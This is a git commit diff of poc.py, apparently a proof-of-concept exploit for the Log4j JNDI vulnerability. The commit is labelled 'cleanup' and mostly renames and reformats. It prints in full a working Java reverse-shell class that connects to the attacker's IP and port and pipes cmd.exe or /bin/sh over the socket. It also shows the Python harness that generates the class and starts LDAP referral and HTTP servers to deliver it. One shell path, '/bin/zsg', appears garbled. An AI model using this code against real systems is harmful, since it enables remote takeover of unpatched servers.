fc8098b41f0ac6a78cbdf4428fca97fa304dc72b
kozmer <kozmer@protonmail.com>
2021-12-16 17:39:23 +0000

    cleanup

--- poc.py
+++ poc.py
@@ -12,76 +12,73 @@ init(autoreset=True)
 def list_to_string(s):
     str1 = ""
     try:
-        for ele in s:
-            str1 += ele
+        for element in s:
+            str1 += element
             return str1
     except Exception:
         parser.print_help()
         sys.exit(1)
 
-
-def check_arg_types(user_ip, web_port, lport):
+# validate the user args
+def check_arg_types(user_ip, web_port, l_port):
     if not web_port.isnumeric():
         print(Fore.RED + "[-] webport must be numeric.")
         sys.exit(1)
-    if not lport.isnumeric():
+    if not l_port.isnumeric():
         print(Fore.RED + "[-] lport must be numeric.")
         sys.exit(1)
 
-
+# genereate the payload
 def payload(user_ip, web_port, l_port):
     check_arg_types(user_ip, web_port, l_port)
+
     gen_exploit = ("""
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
-
 public class Exploit {
 
-  public Exploit() throws Exception {
-    String host = "%s";
-    int port = %s;
-    String cmd = getSystemPlatformExec();
-    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
-    Socket s = new Socket(host, port);
-    InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
-    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
-    while (!s.isClosed()) {
-      while (pi.available()>0)
-        so.write(pi.read());
-      while (pe.available()>0)
-        so.write(pe.read());
-      while (si.available()>0)
-        po.write(si.read());
-      so.flush();
-      po.flush();
-      Thread.sleep(50);
-      try {
-        p.exitValue();
-        break;
-      } catch (Exception e) {
-        e.printStackTrace();
-      }
-    };
-    p.destroy();
-    s.close();
-  }
-  
-  public String getSystemPlatformExec() {
-    String os = System.getProperty("os.name").toLowerCase();
-    if (os.contains("win")){
-      // Operating system is Windows based.
-      return "cmd.exe";
-    } else if (os.contains("osx")){
-      // Operating system is Apple OSX based.
-      return "/bin/bash";   // (not sure, don't have apple to test this).
-    } else if (os.contains("nix") || os.contains("aix") || os.contains("nux")){
-      // Operating system is based on Linux/Unix
-      return "/bin/bash";
+    public Exploit() throws Exception {
+        String host = "%s";
+        int port = %s;
+        String cmd = getSystemPlatformExec();
+        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+        Socket s = new Socket(host, port);
+        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+        while (!s.isClosed()) {
+            while (pi.available()>0)
+                so.write(pi.read());
+            while (pe.available()>0)
+                so.write(pe.read());
+            while (si.available()>0)
+                po.write(si.read());
+            so.flush();
+            po.flush();
+            Thread.sleep(50);
+            try {
+                p.exitValue();
+                break;
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        };
+        p.destroy();
+        s.close();
     }
-    return "/bin/bash";
-  }
+
+    public String getSystemPlatformExec() {
+        String os = System.getProperty("os.name").toLowerCase();
+        if (os.contains("win")){
+            return "cmd.exe";
+        } else if (os.contains("osx")){
+            return "/bin/zsg";
+        } else if (os.contains("nix") || os.contains("aix") || os.contains("nux")){
+            return "/bin/sh";
+        }
+        return "/bin/sh";
+    }
 }
     """) % (user_ip, l_port)
 
@@ -92,8 +89,9 @@ public class Exploit {
         print(Fore.GREEN + '[+] Exploit java class created success')
     except Exception as e:
         print(Fore.RED + f'[-] Something went wrong {e.__str__()}')
-    check_java_available()
-    print(Fore.GREEN + '[+] Setting up the LDAP and web server.')
+
+    check_if_java_availible()
+    print(Fore.GREEN + '[+] Setting up the LDAP and web server.', end="\n\n")
 
     # create the LDAP server on new thread
     t1 = threading.Thread(target=create_ldap_server, args=(user_ip, web_port))
@@ -103,8 +101,10 @@ public class Exploit {
     httpd = HTTPServer(('0.0.0.0', int(web_port)), SimpleHTTPRequestHandler)
     httpd.serve_forever()
 
-def check_java_available():
-    java_version = subprocess.call(['./jdk1.8.0_20/bin/java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+
+def check_if_java_availible():
+    java_version = subprocess.call(
+        ['./jdk1.8.0_20/bin/java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
     if java_version != 0:
         print(Fore.RED + '[-] Java is not installed inside the repository!')
         sys.exit(1)
@@ -131,7 +131,8 @@ def header():
 if __name__ == "__main__":
     header()
     try:
-        parser = argparse.ArgumentParser(description='please enter the values ')
+        parser = argparse.ArgumentParser(
+            description='please enter the values ')
 
         parser.add_argument('--userip', metavar='userip', type=str,
                             nargs='+', help='Enter IP for LDAPRefServer & Shell')
@@ -143,10 +144,8 @@ if __name__ == "__main__":
                             nargs='+', help='Netcat Port')
 
         args = parser.parse_args()
-
-        # print(args.userip)
-
-        payload(list_to_string(args.userip), list_to_string(args.webport), list_to_string(args.lport))
+        payload(list_to_string(args.userip), list_to_string(
+            args.webport), list_to_string(args.lport))
 
     except KeyboardInterrupt:
         print(Fore.RED + "[EXIT] User interrupted the program.")
